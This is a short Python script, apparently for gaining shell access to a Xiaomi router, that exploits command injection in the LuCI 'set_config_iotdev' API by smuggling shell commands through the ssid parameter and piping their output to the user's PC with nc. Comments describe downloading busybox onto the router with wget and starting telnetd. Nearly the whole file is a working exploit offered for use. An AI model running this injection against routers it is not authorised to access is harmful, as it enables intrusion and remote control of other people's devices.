import sys
import urllib.parse
import requests

# On computer:
# $ wget https://github.com/acecilia/OpenWRTInvasion/files/9894805/busybox.zip
# $ unzip busybox.zip busybox
# $ mkdir busybox
# $ cd busybox
# $ mv busybox ./busybox/
# $ sudo apt install ncat
# $ nc -lk 1234 &
# $ python3 -m http.server 8080 &
# $ killall ncat
# On a new session (place it side by side so you see the result of the commands)
# $ python3 xiaomi.py
# (Enter values then type the commands $$ fort shell in shell)
# $$ wget -O /tmp/busybox http://192.168.31.147:8080/busybox
# $$ ls /tmp/busybox
# $$ chmox +x /tmp/busybox
# $$ /tmp/busybox telnetd

stok = input('What\'s the stok:\n')
pc_ip = '192.168.31.' + input('What\'s your PC IP:\n192.168.31.')
pc_port = input('NC port:\n')
template = 'http://192.168.31.1/cgi-bin/luci/;stok={0}/api/misystem/set_config_iotdev?bssid=XXXXXX&user_id=XXXXXX&ssid=-h%0A{1}%0A'

command = input('Next command ("exit" to exit):\n$ ')

while command !=  'exit':
    encoded_up = urllib.parse.quote('{0} 2>&1 | nc {1} {2}'.format(command, pc_ip, pc_port))
    
    url = template.format(stok,encoded_up)
    # print('GET ' + url)
    print(requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}))

    command = input('Next command ("exit" to exit):\n$ ')
